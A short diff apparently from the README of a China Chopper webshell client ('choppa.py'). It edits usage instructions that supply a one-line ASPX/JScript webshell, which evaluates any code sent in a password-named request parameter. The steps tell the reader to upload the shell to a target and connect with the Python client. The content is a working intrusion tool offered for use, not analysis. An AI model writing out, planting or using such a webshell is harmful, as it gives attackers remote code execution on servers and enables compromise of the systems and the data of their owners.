@@ -19,9 +19,11 @@ to future implementations.
 #########################
 INSTRUCTIONS:
 #########################
-1. Change webshell password
+1. Change webshell password value
 
+```js
 <script language="JScript" runat="server">function Page_Load(){eval(Request["Nonqjbexznaoynzrfuvfgbbyf"],"unsafe");}</script>
+```
 
 2. Upload ASPX webshell on target
 3. python choppa.py -p Nonqjbexznaoynzrfuvfgbbyf -m MODE
